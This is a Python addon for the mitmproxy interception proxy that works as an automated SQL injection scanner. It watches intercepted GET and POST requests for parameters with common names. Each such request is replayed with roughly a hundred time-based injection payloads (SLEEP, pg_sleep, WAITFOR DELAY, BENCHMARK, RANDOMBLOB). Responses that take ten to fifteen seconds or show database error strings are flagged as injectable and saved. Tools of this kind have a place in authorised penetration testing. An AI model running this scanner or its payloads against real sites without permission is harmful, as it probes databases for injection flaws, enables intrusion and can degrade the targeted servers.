from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import re
import urllib.parse
import json

class SQLinjec:
    def __init__(self):
        self.custom_sql_inj_flow_dir = "sqlinjection"
        os.makedirs(self.custom_sql_inj_flow_dir, exist_ok=True)
        # Define multiple payloads
        self.custom_sql_inj_payloads = ["'XOR(if(now()=sysdate(),sleep(10),0))OR'","1' and sleep(10)#","sleep(10)#", "1 or sleep(10)#", "\" or sleep(10)#", "' or sleep(10)#", "\" or sleep(10)=\"", "' or sleep(10)='", "1) or sleep(10)#", "\") or sleep(10)=\"", "') or sleep(10)='", "1)) or sleep(10)#", "\")) or sleep(10)=\"", "')) or sleep(10)='", ";waitfor delay '0:0:10'--", ");waitfor delay '0:0:10'--", "';waitfor delay '0:0:10'--", "\";waitfor delay '0:0:10'--", "');waitfor delay '0:0:10'--", "\");waitfor delay '0:0:10'--", "));waitfor delay '0:0:10'--", "'));waitfor delay '0:0:10'--", "\"));waitfor delay '0:0:10'--", "benchmark(10000000,MD5(1))#", "1 or benchmark(10000000,MD5(1))#", "\" or benchmark(10000000,MD5(1))#", "' or benchmark(10000000,MD5(1))#", "1) or benchmark(10000000,MD5(1))#", "\") or benchmark(10000000,MD5(1))#", "') or benchmark(10000000,MD5(1))#", "1)) or benchmark(10000000,MD5(1))#", "\")) or benchmark(10000000,MD5(1))#", "')) or benchmark(10000000,MD5(1))#", "pg_sleep(10)--", "1 or pg_sleep(10)--", "\" or pg_sleep(10)--", "' or pg_sleep(10)--", "1) or pg_sleep(10)--", "\") or pg_sleep(10)--", "') or pg_sleep(10)--", "1)) or pg_sleep(10)--", "\")) or pg_sleep(10)--", "')) or pg_sleep(10)--", "AND (SELECT * FROM (SELECT(SLEEP(10)))bAKL) AND 'vRxe'='vRxe", "AND (SELECT * FROM (SELECT(SLEEP(10)))YjoC) AND '%'='", "AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)", "AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)--", "AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)#", "SLEEP(10)#", "SLEEP(10)--", "SLEEP(10)=\"", "SLEEP(10)='", "or SLEEP(10)", "or SLEEP(10)#", "or SLEEP(10)--", "or SLEEP(10)=\"", "or SLEEP(10)='", "waitfor delay '00:00:10'", "waitfor delay '00:00:10'--", "waitfor delay '00:00:10'#", "benchmark(100000000,MD5(1))", "benchmark(100000000,MD5(1))--", "benchmark(100000000,MD5(1))#", "or benchmark(100000000,MD5(1))", "or benchmark(100000000,MD5(1))--", "or benchmark(100000000,MD5(1))#", "pg_SLEEP(10)", "pg_SLEEP(10)--", "pg_SLEEP(10)#", "or pg_SLEEP(10)", "or pg_SLEEP(10)--", "or pg_SLEEP(10)#", "AnD SLEEP(10)", "AnD SLEEP(10)--", "AnD SLEEP(10)#", "&&SLEEP(10)", "&&SLEEP(10)--", "&&SLEEP(10)#", "' AnD SLEEP(10) ANd '1", "'&&SLEEP(10)&&'1", "ORDER BY SLEEP(10)", "ORDER BY SLEEP(10)--", "ORDER BY SLEEP(10)#", "(SELECT * FROM (SELECT(SLEEP(10)))ecMj)", "(SELECT * FROM (SELECT(SLEEP(10)))ecMj)#", "(SELECT * FROM (SELECT(SLEEP(10)))ecMj)--", "+benchmark(3200,SHA1(1))+'", "+ SLEEP(10) + '", "RANDOMBLOB(1000000000/2)", "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))", "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))", "RANDOMBLOB(1000000000/2)", "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000000/2))))", "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000000/2))))", "SLEEP(10)/*' or SLEEP(10) or '\" or SLEEP(10) or \"*/"]
        self.response_time_lower_bound = 10  # Lower bound of response time in seconds
        self.response_time_upper_bound = 15  # Upper bound of response time in seconds
        self.custom_sql_inj_altered_header = "x-altered-sql"
        self.custom_sql_inj_watched_params = ["sku", "id", "select", "report", "role", "update", "query", "user", "name", "sort", "where", "search", "params", "process", "row", "view", "table", "from", "sel", "results", "sleep", "fetch", "order", "keyword", "column", "field", "delete", "string", "number", "filter", "count", "limit", "offset", "page", "size", "group", "having", "distinct", "union", "intersect", "except", "join", "inner", "outer", "left", "right", "full", "on", "where", "and", "or", "not", "between", "in", "like", "is", "null", "escape", "case", "when", "then", "else", "end", "exists", "any", "all", "cast", "as", "into", "values", "insert", "into", "update", "set", "delete", "truncate", "create", "alter", "drop", "grant", "revoke", "execute", "procedure", "function", "trigger", "schema", "database", "table", "index", "view", "constraint", "primary", "foreign", "key", "unique", "check", "default", "not", "identity", "auto_increment", "commit", "rollback", "savepoint", "transaction", "begin", "end", "analyze", "explain", "optimize", "show", "describe", "pragma", "vacuum", "analyze", "orderby", "asc", "desc", "having", "truncatetable", "backup", "restore", "createdatabase", "dropdatabase", "grantall", "revokeall", "addcolumn", "modifycolumn", "dropcolumn", "createindex", "dropindex", "createtable", "droptable", "createuser", "dropuser", "select", "insertinto", "updateset", "deletefrom", "unionall", "information_schema", "sysobjects", "syscolumns", "sysdatabases", "sysusers", "xp_cmdshell", "exec", "sp_executesql", "sp_adduser", "sp_dropuser", "sp_addlogin", "sp_droplogin", "sp_addrolemember", "sp_droprolemember", "sp_grantdbaccess", "sp_revokedbaccess", "sp_addrolemember", "sp_droprolemember", "sp_addsrvrolemember", "sp_dropsrvrolemember", "sp_password", "xp_regread", "xp_regwrite", "xp_regdelete", "xp_enumgroups", "xp_loginconfig", "xp_availablemedia", "xp_subdirs", "xp_fileexist", "xp_cmdshell", "xp_fixeddrives", "xp_servicecontrol", "xp_regread", "xp_regwrite", "xp_regdelete", "xp_enumgroups", "xp_loginconfig", "xp_availablemedia", "xp_subdirs", "xp_fileexist", "xp_cmdshell", "xp_fixeddrives", "xp_servicecontrol", "COALESCE", "CONCAT", "STUFF", "XMLNAMESPACES", "XQUERY", "XPATH", "XSLT", "TABLESAMPLE", "ROW_NUMBER", "RANK", "DENSE_RANK", "NTILE", "LEAD", "LAG", "FIRST_VALUE", "LAST_VALUE"]  # Parameters to watch
        

    def responsesql(self, flow: http.HTTPFlow) -> None:
        content_type = flow.response.headers.get("Content-Type", "")
        
        # Check if the request has already been altered
        if self.custom_sql_inj_altered_header in flow.request.headers:
            self.check_altered_reflection_sql(flow)
            return

        if flow.request.method in ["GET", "POST"]:
            self.custom_sql_inj_process_params(flow)

    def custom_sql_inj_process_params(self, flow):
        params = {}  # Initialize params to an empty dictionary
        if flow.request.method == "GET":
            params = flow.request.query
        elif flow.request.method == "POST":
            content_type = flow.request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(flow.request.get_text())
            elif "application/json" in content_type:
                try:
                    params = json.loads(flow.request.get_text())
                    if not isinstance(params, dict):
                        params = {}
                except json.JSONDecodeError:
                    ctx.log.info("JSON decode error")
                    params = {}

        # Check if watched parameters are present and alter the request
        for watched_param in self.custom_sql_inj_watched_params:
            if watched_param in params:
                value = params[watched_param][0] if isinstance(params[watched_param], list) else params[watched_param]
                self.sqlinjection_alter_and_replay(flow, watched_param, value)

    def sqlinjection_alter_and_replay(self, original_flow, param, original_value):
        # Loop through each payload
        for altered_value in self.custom_sql_inj_payloads:
            
            altered_flow = self.alter_request_sql(original_flow, param, altered_value)
            if altered_flow:
                ctx.master.commands.call("replay.client", [altered_flow])

    def alter_request_sql(self, original_flow, param, altered_value):
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(new_request.get_text())
                params[param] = [altered_value]
                new_request.text = urllib.parse.urlencode(params, doseq=True)
            elif "application/json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    if param in body and isinstance(body[param], str):
                        body[param] = altered_value
                        new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass
        new_request.headers[self.custom_sql_inj_altered_header] = "true"
        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow

    def check_altered_reflection_sql(self, flow):
        duration = flow.response.timestamp_end - flow.request.timestamp_start
        pattern = r'(SQL error code: -?\d+|database error: .+|syntax error at .+|permission denied|access violation|query failed: .+|unable to connect to database|invalid query syntax|duplicate entry .+|foreign key constraint fails|unexpected error in query)'
        response_text = flow.response.get_text()
        match = re.search(pattern, response_text, re.IGNORECASE)
        if self.response_time_lower_bound <= duration <= self.response_time_upper_bound or match:
            ctx.log.info(f"identify SQL injection: {flow.request.url}")
            self.save_flow_sql(flow)

    def save_flow_sql(self, flow):
        identifier = f"sql_{flow.request.method}_{flow.request.host}_{flow.request.path}".replace("/", "_")
        filename = os.path.join(self.custom_sql_inj_flow_dir, f"{identifier}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"Saved altered flow to {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")

# Add the class instance to mitmproxy addons
addons = [SQLinjec()]
